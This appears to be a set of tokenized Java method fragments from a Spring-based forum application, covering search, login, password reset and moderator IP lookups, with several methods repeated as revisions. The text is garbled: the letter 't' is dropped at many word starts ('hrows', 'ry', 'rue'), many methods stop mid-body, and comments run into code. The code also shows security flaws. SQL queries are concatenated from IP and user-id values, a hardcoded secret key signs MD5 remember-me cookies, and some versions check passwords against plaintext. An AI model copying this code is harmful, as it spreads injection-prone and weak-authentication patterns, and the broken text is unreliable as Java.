public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; ArrayList < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " ime " , ime ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " ime " , ime ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new ModelAndView ( " search " , params ) ; } 
public static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } return SearchViewer . SearchInterval . valueOf ( date ) ; } 
public static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } return SearchViewer . SearchInterval . valueOf ( date . oUpperCase ( ) ) ; } 
public void optimize ( ) hrows IOException , SolrServerException { logger . info ( " Optimizing solr index " ) ; solrServer . optimize ( rue , rue , 5 ) ; logger . info ( " Finished solr index optimization " ) ; } 
public void updateScore ( ) hrows Exception { logger . info ( " Updating score " ) ; Connection db = LorDataSource . getConnection ( ) ; ry { db . setAutoCommit ( false ) ; 
public ModelAndView register ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { Connection db = null ; 
public static User getUser ( Connection con , String name ) hrows SQLException , UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; User user = new User ( con , name ) ; String cacheId = " User?id= " + user . id ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) hrows SQLException , UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { res = new User ( db , id ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; ModelAndView mv = new ModelAndView ( " show-comments " ) ; int opics = 50 ; mv . getModel ( ) . put ( " opics " , opics ) ; if ( offset < 0 ) { hrow new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static List < DeletedListItem > getDeletedComments ( Connection db , int userid ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as msgid, del_info.reason, deldate FROM sections, groups, topics, comments, del_info WHERE sections.id=groups.section AND groups.id=topics.groupid AND comments.topic=topics.id AND del_info.msgid=comments.id AND comments.userid= " + userid + " AND del_info.delby!= " + userid + " ORDER BY del_info.delDate DESC NULLS LAST, del_info.msgid DESC LIMIT 20; " ) ; ImmutableList . Builder < DeletedListItem > builder = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { builder . add ( new DeletedListItem ( rs ) ) ; } rs . close ( ) ; st . close ( ) ; return builder . build ( ) ; } 
public String oString ( ) { return oString ( ags ) ; } 
public static String oString ( List < String > ags ) { if ( ags = = null | | ags . isEmpty ( ) ) { return " " ; } StringBuilder str = new StringBuilder ( ) ; for ( String ag : ags ) { str . append ( str . length ( ) > 0 ? " , " : " " ) . append ( ag ) ; } return str . oString ( ) ; } 
public static SortedSet < String > getTopTags ( Connection con ) hrows SQLException { SortedSet < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>1 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , Tags . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } if ( " 3month " . equalsIgnoreCase ( date ) ) { return SearchViewer . SearchInterval . THREE_MONTH ; support for old url's } return SearchViewer.SearchInterval.valueOf(date.toUpperCase()); } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGI_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public static Map < Integer , String > getIgnoreList ( Connection db , int userid ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=? AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userid ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new HashMap < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sameIP ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private List < TopicItem > getTopics ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate FROM topics, groups, sections, users WHERE topics.groupid=groups.id AND sections.id=groups.section AND users.id=topics.userid AND topics.postip=' " + ip + " ' AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getTopics ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getTopics ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , false ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , rue ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getTopics ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , false ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , rue ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
private static List < UserItem > getUsers ( Connection db , String ip , int uaId ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT MAX(c.postdate) AS lastdate, u.nick, c.ua_id, ua.name AS user_agent " + " FROM comments c LEFT JOIN user_agents ua ON c.ua_id = ua.id " + " JOIN users u ON c.userid = u.id " + " WHERE c.postip=' " + ip + " ' " + " GROUP BY u.nick, c.ua_id, ua.name " + " ORDER BY MAX(c.postdate) DESC, u.nick, ua.name " ) ; ImmutableList . Builder < UserItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new UserItem ( rs , uaId ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
public boolean isSameUa ( ) { return sameUa ; } 
public ModelAndView doLogin ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( required = false ) String activation ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; boolean ajax = isAjax ( request ) ; ry { db = LorDataSource . getConnection ( ) ; 
private int getUserCount ( Connection db , String email ) hrows SQLException { PreparedStatement pst2 = db . prepareStatement ( " SELECT count(*) as c FROM users WHERE email=? " ) ; ResultSet rs = null ; ry { pst2 . setString ( 1 , email ) ; 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized! " ) ; } ry { db = LorDataSource . getConnection ( ) ; 
private static int getUserCount ( Connection db , String email ) hrows SQLException { PreparedStatement pst2 = db . prepareStatement ( " SELECT count(*) as c FROM users WHERE email=? " ) ; ResultSet rs = null ; ry { pst2 . setString ( 1 , email ) ; 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized! " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public boolean isAdministrator ( ) { return candel ; } 
private static void checkView ( Message message , Template mpl , User currentUser ) hrows MessageNotFoundException { if ( mpl . isModeratorSession ( ) ) { return ; } if ( message . isDeleted ( ) ) { if ( message . isExpired ( ) ) { 
public String resetPassword ( Connection db ) hrows SQLException { String password = StringUtil . generatePassword ( ) ; PreparedStatement st = null ; ry { st = db . prepareStatement ( " UPDATE users SET passwd=?,lostpwd = 'epoch' WHERE id=? " ) ; 
public ModelAndView showCodeForm ( ) { return new ModelAndView ( " reset-password-form " ) ; } 
public ModelAndView sendPassword ( @RequestParam ( " email " ) String email , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView resetPassword ( @RequestParam ( " nick " ) String nick , @RequestParam ( " code " ) String formCode , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void checkPassword ( String password ) hrows BadPasswordException { if ( blocked ) { hrow new BadPasswordException ( nick ) ; } if ( password = = null ) { hrow new BadPasswordException ( nick ) ; } if ( ! matchPassword ( password ) ) { hrow new BadPasswordException ( nick ) ; 
public boolean matchPassword ( String password ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; if ( encryptor . checkPassword ( password , his . password ) ) { return rue ; } return password . equals ( his . password ) ; } 
public String resetPassword ( Connection db ) hrows SQLException { String password = StringUtil . generatePassword ( ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String encryptedPassword = encryptor . encryptPassword ( password ) ; PreparedStatement st = null ; ry { st = db . prepareStatement ( " UPDATE users SET passwd=?,lostpwd = 'epoch' WHERE id=? " ) ; 
public boolean matchPassword ( String password ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; ry { if ( encryptor . checkPassword ( password , his . password ) ) { return rue ; } } catch ( EncryptionOperationNotPossibleException ex ) { return password . equals ( his . password ) ; } return password . equals ( his . password ) ; } 
public boolean isPlainPassword ( String password ) { return password . equals ( his . password ) ; } 
public String resetPassword ( Connection db ) hrows SQLException { String password = StringUtil . generatePassword ( ) ; setPassword ( db , password ) ; return password ; } 
public void setPassword ( Connection db , String password ) hrows SQLException { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String encryptedPassword = encryptor . encryptPassword ( password ) ; PreparedStatement st = null ; ry { st = db . prepareStatement ( " UPDATE users SET passwd=?,lostpwd = 'epoch' WHERE id=? " ) ; 
public static String escapeHtmlBBcode ( String content ) { \r".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", "[code-br]", ""}); return content; } 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " itle " ) String itle , @RequestParam ( " info " ) String info , @RequestParam ( " urlName " ) String urlName , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , @RequestParam ( value = " resolvable " , required = false ) String resolvable , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = dataSource . getConnection ( ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " ime " , ime ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " highlight " , required = false ) Set < Integer > highlight ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewForumPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewGalleryPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNew ( int section , WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , int page , String filter , String groupName , int msgid , Set < Integer > highlight ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String getIP ( String name ) hrows ServletParameterException { String ip = getString ( name ) ; if ( ! ipRE . matcher ( ip ) . matches ( ) ) { hrow new ServletParameterBadValueException ( name , " not ip " ) ; } return ip ; } 
private static void check ( String domain , String msgid ) hrows StorageException { if ( ! DOMAIN_CHECK_RE . matcher ( domain ) . matches ( ) ) { hrow new StorageBadDomainException ( domain ) ; } if ( ! NAME_CHECK_RE . matcher ( msgid ) . matches ( ) ) { hrow new StorageBadMsgidException ( msgid ) ; 
public static boolean checkLoginName ( String login ) { login = login . oLowerCase ( ) ; no zerosize login if (login.length() == 0) { return false; } if (login.length() >= 80) { return false; } return loginCheckRE.matcher(login).matches(); } 
public static boolean isUrl ( String x ) { return isUrl . matcher ( x ) . matches ( ) ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView encodePasswords ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; ry { db . setAutoCommit ( false ) ; 
public boolean matchPassword ( String password ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; ry { return encryptor . checkPassword ( password , his . password ) ; 
public void checkPassword ( String password ) hrows BadPasswordException { if ( blocked ) { hrow new BadPasswordException ( nick ) ; } if ( password = = null ) { hrow new BadPasswordException ( nick ) ; } if ( anonymous & & password . isEmpty ( ) ) { return ; } if ( ! matchPassword ( password ) ) { hrow new BadPasswordException ( nick ) ; 
public boolean isCommentsAllowed ( User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( deleted | | expired ) { return false ; } int score = getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . canModerate ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } if ( score = = POSTSCORE_MOD_AUTHOR ) { return user . getId ( ) = = userid ; } return user . getScore ( ) > = score ; } 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( required = false ) Boolean sticky , @RequestParam ( required = false ) Boolean notop ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } if ( sticky = = null ) { sticky = false ; } if ( notop = = null ) { notop = false ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
